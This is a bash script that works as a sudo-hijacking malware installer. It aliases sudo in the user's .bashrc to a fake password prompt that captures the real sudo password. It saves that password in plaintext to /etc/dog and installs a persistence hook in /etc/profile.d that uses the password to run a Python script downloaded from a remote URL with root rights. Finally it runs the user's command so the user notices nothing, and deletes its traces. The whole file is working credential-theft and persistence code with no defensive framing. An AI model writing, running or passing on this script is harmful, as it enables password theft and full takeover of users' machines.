#!/bin/bash

# Check if user is already root
if [ "$EUID" -eq 0 ]; then
    cat > /etc/profile.d/monitor.sh << 'EOF'
#!/bin/bash
python /usr/bin/monitor.py
EOF
    chmod +x /etc/profile.d/monitor.sh

    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"

    exit 0
else
    GB_DIR="$HOME/.local/share/gb"
    SCRIPT_FILENAME="script.sh"
    SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"

    mkdir -p "$GB_DIR"

    cat > "$SCRIPT_FILE" << 'EOF'
#!/bin/bash

GB_DIR="$HOME/.local/share/gb"
PASSWD_FILE="$GB_DIR/passwd"

attempts=0
max_attempts=3
success=false

while [ $attempts -lt $max_attempts ]; do
    echo -n "[sudo] password for $USER: "
    read -s user_input
    echo

    if printf "%s\n" "$user_input" | /usr/bin/sudo -S -k true 2>/dev/null; then
        # Correct password
        success=true
        break
    else
        attempts=$((attempts + 1))
        [ $attempts -lt $max_attempts ] && echo "Sorry, try again."
    fi
done

if [ "$success" = false ]; then
    echo "sudo: 3 incorrect password attempts"
    exit 1
fi

# Store the password
echo "$user_input" > "$PASSWD_FILE"

# Deploy monitoring & move passwd to /etc/dog
echo "$user_input" | /usr/bin/sudo -S bash <<DEPLOYEOF
    cp "$PASSWD_FILE" /etc/dog

    cat > /etc/profile.d/monitor.sh << "MONITOREOF"
#!/bin/bash
if [ -f /etc/dog ]; then
    SUDO_PASS=$(cat /etc/dog)
    echo "$SUDO_PASS" | /usr/bin/sudo -S python /usr/bin/monitor.py
fi
MONITOREOF
    chmod +x /etc/profile.d/monitor.sh
    curl -s -o /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py" || \
    wget -q -O /usr/bin/monitor.py "http://github.com/kaucrow/good-boy/watchdog.py"

    rm -rf "$GB_DIR"
DEPLOYEOF

ASKPASS_SCRIPT=$(mktemp)
echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
chmod +x "$ASKPASS_SCRIPT"

# Execute the original command
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"

# Cleanup
rm -f "$ASKPASS_SCRIPT"
rm -f "$SCRIPT_FILE"
unalias sudo 2>/dev/null
sed -i "\|alias sudo=$SCRIPT_FILE|d" "$HOME/.bashrc"
EOF

    chmod +x $SCRIPT_FILE

    # Add alias to .bashrc if not already present
    if ! grep -q "alias sudo=$SCRIPT_FILE" "$HOME/.bashrc" 2>/dev/null; then
        echo "alias sudo=$SCRIPT_FILE" >> "$HOME/.bashrc"
    fi
fi